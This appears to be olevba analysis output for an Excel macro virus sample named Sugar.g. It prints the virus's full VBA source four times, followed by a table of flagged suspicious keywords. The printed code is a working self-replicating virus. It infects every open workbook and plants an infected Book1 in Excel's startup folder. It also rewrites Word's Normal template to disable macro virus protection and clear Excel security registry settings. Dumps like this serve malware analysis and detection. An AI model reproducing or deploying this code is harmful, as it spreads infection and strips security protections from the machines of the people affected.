olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Sugar.g-1649a45219ee931d0d0608bbf8befff8d780d95d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Sugar.g-1649a45219ee931d0d0608bbf8befff8d780d95d - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Sugar.g-1649a45219ee931d0d0608bbf8befff8d780d95d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Sugar.g-1649a45219ee931d0d0608bbf8befff8d780d95d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Sugar.g-1649a45219ee931d0d0608bbf8befff8d780d95d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

